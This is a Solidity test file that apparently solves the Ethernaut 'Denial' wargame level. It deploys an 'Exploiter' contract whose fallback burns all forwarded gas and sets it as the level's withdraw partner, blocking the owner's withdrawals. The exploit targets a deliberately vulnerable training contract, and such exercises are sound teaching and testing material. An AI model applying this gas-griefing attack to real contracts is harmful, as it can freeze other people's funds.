// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Denial.sol";
import "../src/levels/DenialFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestDenial is BaseTest{
    using SafeMath for uint256;
    Denial level;


    constructor() public{
        levelFactory = new DenialFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);
                
    }

    function exploitLevel() internal override{
        vm.prank(player, player);
        Exploiter attackContract = new Exploiter();
        level.setWithdrawPartner(address(attackContract));
        // level.withdraw();
        // assertEq(level.entrant(), player);
    }
}

contract Exploiter {
   fallback() payable external{
    assert(false); //this will consume all gas attach with transaction
   }
}